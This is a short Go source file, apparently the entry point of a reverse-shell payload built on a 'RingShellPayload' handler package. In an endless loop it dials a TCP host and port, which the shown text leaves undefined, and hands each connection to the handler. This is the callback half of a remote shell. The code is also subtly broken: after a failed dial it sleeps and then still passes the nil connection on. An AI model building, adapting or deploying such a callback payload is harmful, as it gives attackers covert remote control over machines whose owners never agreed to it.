package main

import (
	"fmt"
	"net"
	"time"

	"github.com/MustafaAbdulazizHamza/RingShellPayload/Handler"
)


func main() {
	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", address, port))
		if err != nil {
			time.Sleep(100 * time.Second)
		}
		Handler.Handle(conn)
	}
}
